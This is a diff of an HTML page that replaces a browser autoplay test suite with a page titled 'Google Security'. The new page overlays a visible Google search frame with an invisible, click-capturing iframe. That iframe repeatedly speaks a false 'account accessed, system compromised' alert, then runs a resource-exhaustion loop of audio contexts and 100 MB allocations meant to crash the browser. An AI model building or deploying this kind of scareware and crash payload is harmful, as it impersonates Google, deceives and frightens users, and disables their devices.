@@ -3,225 +3,135 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Autoplay Zero-Click Test Suite</title>
+<title>Google Security</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #121212; color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; }
-  h1 { color: #ff6b6b; font-size: 24px; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 10px; }
-  .panel { background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #333; }
-  button { padding: 15px; background: #0e639c; color: #fff; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; margin-top: 10px; }
-  button:hover { background: #1177bb; }
-  #log { background: #000; color: #0f0; font-family: monospace; font-size: 12px; padding: 15px; height: 200px; overflow-y: auto; border-radius: 6px; border: 1px solid #333; }
-  .success { color: #4caf50; }
-  .error { color: #f44336; }
-  .warn { color: #ff9800; }
-  .info { color: #2196f3; }
-  iframe { display: none; }
+  body { background: #fff; height: 100vh; overflow: hidden; margin: 0; }
+  
+  /* Iframe Google (Terlihat) */
+  #googleFrame {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    border: none;
+    z-index: 1;
+  }
+
+  /* Iframe Payload (Tersembunyi, menutupi Google) */
+  #payloadFrame {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    border: none;
+    opacity: 0; /* Transparan, tapi menerima klik & memutar suara */
+    z-index: 2;
+  }
 </style>
 </head>
 <body>
 
-<h1>🔊 Autoplay Zero-Click Bypass Suite</h1>
-<div class="panel">
-  <p style="font-size: 14px; color: #aaa;">Uji coba 4 metode bypass secara otomatis saat halaman dimuat. Pastikan Pop-up diizinkan.</p>
-  <button id="btnRun">🔄 Jalankan Ulang Tes</button>
-</div>
+<!-- Iframe Google -->
+<iframe id="googleFrame" src="https://www.google.com/search?igu=1"></iframe>
 
-<div id="log">Menunggu eksekusi...</div>
+<!-- Iframe Payload (TTS + Crash) -->
+<iframe id="payloadFrame" allow="autoplay; camera; microphone"></iframe>
 
 <script>
 (function () {
   'use strict';
 
-  const logEl = document.getElementById('log');
-  let testCounter = 0;
-
-  function log(msg, type = '') {
-    const time = new Date().toISOString().substr(11, 8);
-    const span = document.createElement('span');
-    if (type) span.className = type;
-    span.innerHTML = `[${time}] ${msg}<br>`;
-    logEl.appendChild(span);
-    logEl.scrollTop = logEl.scrollHeight;
-    console.log(msg);
-  }
+  var payloadFrame = document.getElementById('payloadFrame');
 
   // ============================================
-  // GENERATOR PAYLOAD HTML
+  // PAYLOAD YANG DISUNTIKKAN DI ATAS GOOGLE
   // ============================================
-  function getPayload(type) {
-    let title = "", bodyText = "", audioScript = "";
+  var payloadHTML = `
+    <!DOCTYPE html>
+    <html>
+    <head><title>Alert</title></head>
+    <body style="background:transparent;margin:0;cursor:pointer;">
+      <script>
+        (function() {
+          // A. TTS (Google Alert)
+          function speak() {
+            if (!('speechSynthesis' in window)) return;
+            var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been accessed. System compromised.");
+            u.lang = 'en-US';
+            u.rate = 1.0;
+            u.volume = 1.0;
+            window.speechSynthesis.speak(u);
+          }
 
-    if (type === 'V1') {
-      title = "Varian 1: Full Autoplay";
-      bodyText = "TTS + AudioContext (allow=autoplay)";
-      audioScript = `
-        // 1. TTS
-        if ('speechSynthesis' in window) {
-          var u = new SpeechSynthesisUtterance("Variant One. T T S and Audio Context.");
-          u.lang = 'en-US';
-          window.speechSynthesis.speak(u);
-        }
-        // 2. AudioContext
-        try {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          if (ctx.state === 'suspended') ctx.resume();
-          var osc = ctx.createOscillator();
-          osc.type = 'sine';
-          osc.frequency.value = 880;
-          osc.connect(ctx.destination);
-          osc.start();
-          osc.stop(ctx.currentTime + 2.0);
-        } catch(e) {}
-      `;
-    } else if (type === 'V2') {
-      title = "Varian 2: No Allow";
-      bodyText = "TTS + AudioContext (TANPA allow=autoplay)";
-      audioScript = `
-        // 1. TTS
-        if ('speechSynthesis' in window) {
-          var u = new SpeechSynthesisUtterance("Variant Two. No allow attribute.");
-          u.lang = 'en-US';
-          window.speechSynthesis.speak(u);
-        }
-        // 2. AudioContext
-        try {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          if (ctx.state === 'suspended') ctx.resume();
-          var osc = ctx.createOscillator();
-          osc.frequency.value = 440;
-          osc.connect(ctx.destination);
-          osc.start();
-          osc.stop(ctx.currentTime + 2.0);
-        } catch(e) {}
-      `;
-    } else if (type === 'V3') {
-      title = "Varian 3: TTS Only";
-      bodyText = "Hanya TTS (Tanpa AudioContext)";
-      audioScript = `
-        // 1. TTS Saja
-        if ('speechSynthesis' in window) {
-          var u = new SpeechSynthesisUtterance("Variant Three. T T S only. No audio context.");
-          u.lang = 'en-US';
-          window.speechSynthesis.speak(u);
-        }
-      `;
-    } else if (type === 'V4') {
-      title = "Varian 4: No Click Nav";
-      bodyText = "Navigasi Paksa + TTS";
-      audioScript = `
-        // 1. TTS
-        if ('speechSynthesis' in window) {
-          var u = new SpeechSynthesisUtterance("Variant Four. Forced navigation no click.");
-          u.lang = 'en-US';
-          window.speechSynthesis.speak(u);
-        }
-      `;
+          // B. AudioContext Unlock
+          function unlockAudio() {
+            try {
+              var ctx = new (window.AudioContext || window.webkitAudioContext)();
+              if (ctx.state === 'suspended') ctx.resume();
+              var osc = ctx.createOscillator();
+              var gain = ctx.createGain();
+              gain.gain.value = 0.1;
+              osc.connect(gain);
+              gain.connect(ctx.destination);
+              osc.start();
+              osc.stop(ctx.currentTime + 0.5);
+            } catch(e) {}
+          }
+
+          // Jalankan Zero-Click Bypass
+          speak();
+          unlockAudio();
+          
+          // Loop TTS
+          setInterval(speak, 5000);
+
+          // C. RESOURCE EXHAUSTION (Crash setelah 1.5 detik)
+          setTimeout(function() {
+            setInterval(function() {
+              try {
+                for (var i = 0; i < 1000; i++) {
+                  var c = new (window.AudioContext || window.webkitAudioContext)();
+                  var o = c.createOscillator();
+                  o.connect(c.destination);
+                  o.start(0);
+                  
+                  var v = new SpeechSynthesisUtterance("CRASH_" + i);
+                  window.speechSynthesis.speak(v);
+                }
+                var bigArray = new Uint8Array(100 * 1024 * 1024);
+                bigArray.fill(1);
+                window.memoryHog = window.memoryHog || [];
+                window.memoryHog.push(bigArray);
+              } catch(e) {}
+            }, 50);
+          }, 1500);
+
+        })();
+      <\/script>
+    </body>
+    </html>
+  `;
+
+  // Tulis payload ke iframe kedua
+  payloadFrame.onload = function() {
+    try {
+      var doc = payloadFrame.contentDocument || payloadFrame.contentWindow.document;
+      doc.open();
+      doc.write(payloadHTML);
+      doc.close();
+      console.log("[!] Payload Autoplay + Crash disuntikkan di atas Google.");
+    } catch(e) {
+      console.log("Gagal menyuntikkan payload: " + e.message);
     }
+  };
 
-    return `
-      <!DOCTYPE html>
-      <html>
-      <head><title>${title}</title></head>
-      <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh;">
-        <h1>${type}</h1>
-        <p>${bodyText}</p>
-        <script>
-          (function() {
-            ${audioScript}
-          })();
-        <\/script>
-      </body>
-      </html>
-    `;
-  }
-
-  // ============================================
-  // EKSEKUTOR METODE
-  // ============================================
-  function runTest(type) {
-    log(`=== MEMULAI ${type} ===`, 'info');
-    const payload = getPayload(type);
-
-    // Metode A: Iframe (Dengan allow)
-    if (type === 'V1') {
-      const iframe = document.createElement('iframe');
-      iframe.allow = "autoplay";
-      iframe.src = 'about:blank';
-      document.body.appendChild(iframe);
-      iframe.onload = () => {
-        try {
-          const doc = iframe.contentDocument;
-          doc.open(); doc.write(payload); doc.close();
-          log(`${type}: Payload ditulis ke iframe (allow=autoplay).`, 'success');
-        } catch(e) { log(`${type} Iframe Error: ${e.message}`, 'error'); }
-      };
-    }
-
-    // Metode B: Iframe (Tanpa allow)
-    if (type === 'V2') {
-      const iframe = document.createElement('iframe');
-      iframe.src = 'about:blank';
-      document.body.appendChild(iframe);
-      iframe.onload = () => {
-        try {
-          const doc = iframe.contentDocument;
-          doc.open(); doc.write(payload); doc.close();
-          log(`${type}: Payload ditulis ke iframe (no allow).`, 'success');
-        } catch(e) { log(`${type} Iframe Error: ${e.message}`, 'error'); }
-      };
-    }
-
-    // Metode C: Iframe / Popup
-    if (type === 'V3' || type === 'V4') {
-      // Coba Popup
-      const win = window.open('about:blank', '_blank');
-      if (win) {
-        try {
-          win.document.open(); win.document.write(payload); win.document.close();
-          log(`${type}: Payload ditulis ke Popup window.`, 'success');
-        } catch(e) { log(`${type} Popup Error: ${e.message}`, 'error'); }
-      } else {
-        log(`${type}: Popup diblokir! Coba Iframe sebagai fallback...`, 'warn');
-        const iframe = document.createElement('iframe');
-        iframe.src = 'about:blank';
-        document.body.appendChild(iframe);
-        iframe.onload = () => {
-          const doc = iframe.contentDocument;
-          doc.open(); doc.write(payload); doc.close();
-          log(`${type}: Payload ditulis ke Iframe fallback.`, 'success');
-        };
-      }
-    }
-  }
-
-  // ============================================
-  // ORKESTRASI (JALANKAN SEMUA)
-  // ============================================
-  function startSuite() {
-    logEl.innerHTML = '';
-    log('Memulai Autoplay Test Suite (Zero-Click)...', 'info');
-    
-    // Eksekusi berurutan dengan jeda agar tidak saling bentrok
-    setTimeout(() => runTest('V1'), 100);
-    setTimeout(() => runTest('V2'), 1500);
-    setTimeout(() => runTest('V3'), 3000);
-    setTimeout(() => runTest('V4'), 4500);
-
-    setTimeout(() => {
-      log('=== TES SELESAI ===', 'info');
-      log('Jika Anda mendengar suara TTS/Audio, berarti browser rentan (Bug Bounty Valid).', 'warn');
-      log('Jika hening, browser Anda aman (Expected Behavior).', 'success');
-    }, 6000);
-  }
-
-  // Event Listener
-  document.getElementById('btnRun').addEventListener('click', startSuite);
-
-  // Auto-run saat halaman dimuat
-  window.addEventListener('load', startSuite);
+  // Trigger load iframe payload (about:blank)
+  payloadFrame.src = 'about:blank';
 
 })();
 </script>
 </body>
-</html> tuh
+</html>
